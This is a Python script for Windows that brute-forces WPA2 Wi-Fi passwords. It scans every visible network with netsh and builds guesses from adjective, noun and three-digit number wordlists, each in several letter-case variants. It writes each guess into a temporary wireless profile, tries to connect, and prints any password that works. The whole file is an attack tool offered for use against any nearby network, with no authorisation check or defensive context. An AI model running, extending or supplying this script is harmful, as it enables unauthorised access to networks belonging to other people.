import os
import sys
import csv
import re
import time
import tempfile
import subprocess
import random
import itertools
from subprocess import CalledProcessError

# ------------------------------------------------------------
# Configuration
# ------------------------------------------------------------
PASSWORDS = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'password.csv')   # fallback if needed
ADJECTIVES = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'adjectives.txt')
NOUNS = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'nouns.txt')

# Number range for the 3‑digit suffix (can be range(1000) for all 000‑999,
# or a custom list like [123, 456, 789, 111, 222] to cut down attempts)
NUMBER_RANGE = range(1000)        # 0..999 → formatted as 3 digits
MAX_COMBOS = 5000                # sample randomly if total combos exceed this (set to None for all)

# ------------------------------------------------------------
# 1. Get nearby Wi‑Fi networks (Windows)
# ------------------------------------------------------------
def get_network_list():
    try:
        output = subprocess.check_output(
            ['netsh', 'wlan', 'show', 'networks', 'mode=bssid'],
            encoding='utf-8',
            errors='ignore'
        )
    except CalledProcessError:
        print("Error: 'netsh' command failed. Are you running as Administrator?")
        sys.exit(1)

    networks = []
    current_ssid = None

    for line in output.splitlines():
        line = line.strip()
        if line.startswith('SSID'):
            parts = line.split(':', 1)
            if len(parts) == 2:
                current_ssid = parts[1].strip()
        elif line.startswith('BSSID') and current_ssid:
            parts = line.split(':', 1)
            if len(parts) == 2:
                bssid = parts[1].strip()
                networks.append({'ssid': current_ssid, 'bssid': bssid})
                # Keep current_ssid for next BSSID, but we deduplicate later

    # Deduplicate by SSID (keep first occurrence)
    seen = set()
    unique = []
    for net in networks:
        if net['ssid'] not in seen:
            seen.add(net['ssid'])
            unique.append(net)
    return unique

# ------------------------------------------------------------
# 2. Case variants (same as before)
# ------------------------------------------------------------
def get_password_array(password):
    variants = []
    variants.append(password.lower())                 # all lower
    variants.append(password.upper())                 # all upper
    variants.append(password.capitalize())            # first upper
    variants.append(''.join(c.lower() if i % 2 == 0 else c for i, c in enumerate(password)))  # every other lower
    variants.append(''.join(c.upper() if i % 2 == 0 else c for i, c in enumerate(password)))  # every other upper
    return variants   # list of 5 strings

# ------------------------------------------------------------
# 3. Combo generator: adjective + noun + 3‑digit number
# ------------------------------------------------------------
def generate_combo_passwords(adj_file=ADJECTIVES, noun_file=NOUNS,
                             number_range=NUMBER_RANGE, max_combos=MAX_COMBOS):
    try:
        with open(adj_file, 'r', encoding='utf-8') as f:
            adjectives = [line.strip() for line in f if line.strip()]
        with open(noun_file, 'r', encoding='utf-8') as f:
            nouns = [line.strip() for line in f if line.strip()]
    except FileNotFoundError as e:
        print(f"Error: {e.filename} not found.")
        sys.exit(1)

    if not adjectives or not nouns:
        print("Error: One of the wordlists is empty.")
        sys.exit(1)

    nums = list(number_range)
    total_possible = len(adjectives) * len(nouns) * len(nums)
    print(f"Total possible passwords: {total_possible:,}")

    if max_combos and total_possible > max_combos:
        print(f"Will randomly try {max_combos:,} of them.")
        seen = set()
        attempts = 0
        while len(seen) < max_combos and attempts < max_combos * 10:
            adj = random.choice(adjectives)
            noun = random.choice(nouns)
            num = random.choice(nums)
            pwd = f"{adj}{noun}{num:03d}"
            if pwd not in seen:
                seen.add(pwd)
                yield pwd   # <-- yields IMMEDIATELY, no huge list
            attempts += 1
        if len(seen) < max_combos:
            print(f"Warning: only found {len(seen)} unique combos.")
    else:
        # Sequential (lazy) – safe for large lists
        for adj in adjectives:
            for noun in nouns:
                for num in nums:
                    yield f"{adj}{noun}{num:03d}"

# ------------------------------------------------------------
# 4. Fast connection attempt (polling)
# ------------------------------------------------------------
def try_connect(ssid, password, max_wait=3.0):
    xml_template = """<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""

    xml_content = xml_template.format(ssid=ssid, password=password)

    with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False) as f:
        f.write(xml_content)
        temp_xml = f.name

    try:
        subprocess.run(['netsh', 'wlan', 'add', 'profile', f'filename={temp_xml}'],
                       check=True, capture_output=True, encoding='utf-8')
        subprocess.run(['netsh', 'wlan', 'connect', f'name={ssid}'],
                       check=True, capture_output=True, encoding='utf-8')

        start = time.time()
        connected = False
        while time.time() - start < max_wait:
            status = subprocess.check_output(['netsh', 'wlan', 'show', 'interfaces'],
                                             encoding='utf-8', errors='ignore')
            for line in status.splitlines():
                if 'SSID' in line and ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2 and parts[1].strip() == ssid:
                        connected = True
                        break
            if connected:
                break
            time.sleep(0.2)
        return connected
    except CalledProcessError:
        return False
    finally:
        try:
            os.unlink(temp_xml)
        except OSError:
            pass

# ------------------------------------------------------------
# 5. Main loop
# ------------------------------------------------------------
def main():
    # Get visible networks
    networks = get_network_list()
    if not networks:
        print("No Wi‑Fi networks found. Make sure Wi‑Fi is enabled.")
        return

    print(f"Found {len(networks)} network(s):")
    for i, net in enumerate(networks, 1):
        print(f"  {i}. {net['ssid']} (BSSID: {net['bssid']})")

    # Generate combo passwords
    password_gen = generate_combo_passwords()

    # For each network, try all passwords
    for net in networks:
        ssid = net['ssid']
        print(f"\n--- Trying network: {ssid} ---")
        for base_pwd in password_gen:
            variants = get_password_array(base_pwd)
            for variant in variants:
                print(f"  Trying: '{variant}'")
                if try_connect(ssid, variant):
                    print(f"\n✅ SUCCESS! Network: {ssid}\n   Password: {variant}\n")
                    sys.exit(0)
        print(f"  ❌ No password worked for {ssid}")

    print("\n❌ All networks exhausted. No valid password found.")

if __name__ == "__main__":
    main()